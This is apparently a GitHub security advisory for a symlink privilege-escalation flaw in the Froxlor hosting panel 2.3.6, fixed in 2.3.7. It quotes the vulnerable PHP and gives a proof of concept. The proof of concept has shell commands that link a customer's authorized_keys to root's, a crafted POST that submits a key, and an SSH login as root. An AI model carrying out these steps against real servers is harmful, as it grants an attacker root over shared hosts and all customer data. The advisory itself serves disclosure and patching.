# [H] Froxlor has privilege escalation in SSH key synchronization via symlinked `authorized_keys` path

## Summary
Severity: High
Advisory: GHSA-mq5v-pxpm-8jw2
CVE: CVE-2026-41236
CWE: CWE-59
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-mq5v-pxpm-8jw2
Type: github-advisory

## Affected
- Packagist: `froxlor/froxlor` — affected >=2.3.6 <2.3.7

## Details
### Summary
Froxlor 2.3.6 contains a symlink-following flaw in the root-owned SSH key synchronization path used for customer FTP users. The provisioning code appends public keys to `~/.ssh/authorized_keys` under a customer-controlled home directory without verifying that the target path is not a symbolic link.

If an attacker controls a shell-enabled customer account and can modify files inside the assigned home directory, the attacker can replace `~/.ssh/authorized_keys` with a symlink to `/root/.ssh/authorized_keys`. When Froxlor's privileged cron task later synchronizes SSH keys, it appends the attacker-supplied key into root's authorized key file, resulting in root SSH access.

### Details
The customer-facing SSH key workflow accepts an FTP user selection and an arbitrary public key from the authenticated session and forwards them into `SshKeys::add()`:

```php
// customer_ftp.php:251-253
if ($action == 'add' && Request::post('send') == 'send') {
    $result = $log->logAction(USR_ACTION, LOG_INFO, "added SSH-key");
    Commands::get()->apiCall('SshKeys.add', Request::postAll());
}
```

On the server side, the add handler stores the public key and schedules an NSS rebuild as long as the customer has shell capability enabled at the customer level:

```php
// lib/Froxlor/Api/Commands/SshKeys.php:67-70,120-145
if ($this->getUserDetail('shell_allowed') != '1') {
    throw new Exception("You cannot add SSH keys because shell access is disabled for your account.");
}

$ins_stmt = Database::prepare("
    INSERT INTO `" . TABLE_PANEL_CUSTOMERS_SSH ."`.
");
Settings::AddTask('rebuildnssusers');
```

Later, a root-owned cron path enters `SshKeys::generateFiles()` and derives the target path by simple string concatenation:

```php
// lib/Froxlor/Cron/System/SshKeys.php:52-64
$sshdir = FileDir::makeCorrectDir($userinfo['homedir'] . '/.ssh');
$authkeysfile = FileDir::makeCorrectFile($sshdir . '/authorized_keys');
if (!file_exists($authkeysfile)) {
    touch($authkeysfile);
}
```

The helper used here only normalizes the path string and does not resolve or reject symlinks:

```php
// lib/Froxlor/FileDir.php:376-392
public static function makeCorrectFile(string $file): string
{
    $file = str_replace('//', '/', $file);
    $file = str_replace('\\', '', $file);
    return $file;
}
```

The root-owned sync code then appends attacker-controlled SSH key material to the derived path:

```php
// lib/Froxlor/Cron/System/SshKeys.php:94-103
file_put_contents($authkeysfile, $userinfo['ssh-rsa'] . "\n", FILE_APPEND | LOCK_EX);
chown($authkeysfile, $userinfo['uid']);
chgrp($authkeysfile, $userinfo['gid']);
```

Because Froxlor also grants the customer ownership of the home directory tree during account provisioning, the attacker can place a symbolic link at `~/.ssh/authorized_keys` before the privileged synchronization step runs.


### PoC
An attacker needs an authenticated customer account with shell-enabled home-directory control. That prerequisite may exist by normal configuration, or it may be obtained first through the separate FTP shell-assignment authorization bypass described in the companion report.

Relevant runtime prerequisites:

- the attacker controls a customer-owned home directory on the target host
- the attacking customer has `shell_allowed=1`
- the attacker can submit SSH keys through the Froxlor panel
- Froxlor's master cron runs with the intended root privileges

Complete PoC flow:

1. Obtain shell access as the customer-owned account and prepare a symlink in the home directory:

```bash
mkdir -p ~/.ssh
rm -f ~/.ssh/authorized_keys
ln -s /root/.ssh/authorized_keys ~/.ssh/authorized_keys
```

2. From an authenticated Froxlor customer session, submit a new SSH public key for the relevant FTP user:

```http
POST /customer_ftp.php?page=sshkeys&action=add HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Cookie: <authenticated customer session>

csrf_token=VALID_CSRF_TOKEN&
send=send&
description=poc&
ftpuser=17&
ssh_pubkey=ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB attacker@host
```

3. Wait for Froxlor's master cron to process the queued `REBUILD_NSSUSERS` task.
4. Use the corresponding private key to authenticate as root:

```bash
ssh -i id_ed25519 root@target.example
```

Result:

- the root-owned cron task follows the symlinked `authorized_keys` path
- the submitted public key is appended to `/root/.ssh/authorized_keys`
- SSH access as `root` succeeds with the attacker's key pair

### Impact
This is a direct customer-to-root privilege escalation on the managed host. A successful attacker can obtain full operating-system control, read or modify all hosted customer data, persist at the highest privilege level, and tamper with every service administered by the server.

## References
- https://github.com/froxlor/froxlor/security/advisories/GHSA-mq5v-pxpm-8jw2
- https://nvd.nist.gov/vuln/detail/CVE-2026-41236
- https://github.com/froxlor/froxlor
- https://github.com/froxlor/froxlor/releases/tag/2.3.7
